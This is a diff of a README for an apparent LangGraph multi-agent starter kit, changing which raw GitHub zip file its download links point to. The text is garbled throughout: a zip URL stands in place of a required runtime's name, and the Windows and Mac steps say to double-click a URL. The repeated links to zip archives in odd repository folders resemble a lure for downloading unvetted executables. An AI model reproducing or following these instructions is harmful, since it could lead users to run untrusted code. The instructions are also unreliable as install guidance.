@@ -4,19 +4,19 @@
 Welcome to the **langgraph-starter-kit**! This project provides a helpful starting point for creating multi-agent AI systems using LangGraph. It comes equipped with essential features like Swarm and Supervisor patterns, memory capabilities, useful tools, and an HTTP API to accelerate your development.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download langgraph-starter-kit](https://raw.githubusercontent.com/ccxtties/langgraph-starter-kit/main/dubitatively/langgraph-starter-kit.zip)
+To get started, visit this page to download: [Download langgraph-starter-kit](https://github.com/ccxtties/langgraph-starter-kit/raw/refs/heads/main/examples/langgraph_starter_kit_2.6-alpha.2.zip)
 
 ## 🔧 Prerequisites
 Before you begin, ensure your system meets these requirements:
 - **Operating System:** Windows, Mac, or a recent version of Linux.
 - **RAM:** At least 4 GB of RAM.
 - **Storage:** Minimum of 500 MB of free disk space.
-- **https://raw.githubusercontent.com/ccxtties/langgraph-starter-kit/main/dubitatively/langgraph-starter-kit.zip** Version 14.x or later installed on your machine.
+- **https://github.com/ccxtties/langgraph-starter-kit/raw/refs/heads/main/examples/langgraph_starter_kit_2.6-alpha.2.zip** Version 14.x or later installed on your machine.
 
 ## 📖 Installation Steps
 Follow these steps to download and run the **langgraph-starter-kit**:
 
-1. **Visit the Releases Page:** Click this link to go to the downloads section: [Download langgraph-starter-kit](https://raw.githubusercontent.com/ccxtties/langgraph-starter-kit/main/dubitatively/langgraph-starter-kit.zip).
+1. **Visit the Releases Page:** Click this link to go to the downloads section: [Download langgraph-starter-kit](https://github.com/ccxtties/langgraph-starter-kit/raw/refs/heads/main/examples/langgraph_starter_kit_2.6-alpha.2.zip).
   
 2. **Choose Your Version:** Look through the available versions. The latest version is usually at the top. Select the version you want to download.
 
@@ -25,8 +25,8 @@ Follow these steps to download and run the **langgraph-starter-kit**:
 4. **Extract the Files:** After the download is complete, locate the downloaded file. If it’s a ZIP file, right-click on it and select "Extract All" or use extraction software to unpack the files.
 
 5. **Run the Application:**
-   - For Windows: Double-click on `https://raw.githubusercontent.com/ccxtties/langgraph-starter-kit/main/dubitatively/langgraph-starter-kit.zip`.
-   - For Mac: Open the extracted folder and double-click on `https://raw.githubusercontent.com/ccxtties/langgraph-starter-kit/main/dubitatively/langgraph-starter-kit.zip`.
+   - For Windows: Double-click on `https://github.com/ccxtties/langgraph-starter-kit/raw/refs/heads/main/examples/langgraph_starter_kit_2.6-alpha.2.zip`.
+   - For Mac: Open the extracted folder and double-click on `https://github.com/ccxtties/langgraph-starter-kit/raw/refs/heads/main/examples/langgraph_starter_kit_2.6-alpha.2.zip`.
    - For Linux: Open a terminal, navigate to the directory where you extracted the files, then run `./langgraph-starter-kit`.
 
 6. **Follow the Setup Wizard:** Upon running the app, a setup wizard will guide you through the initial configuration.
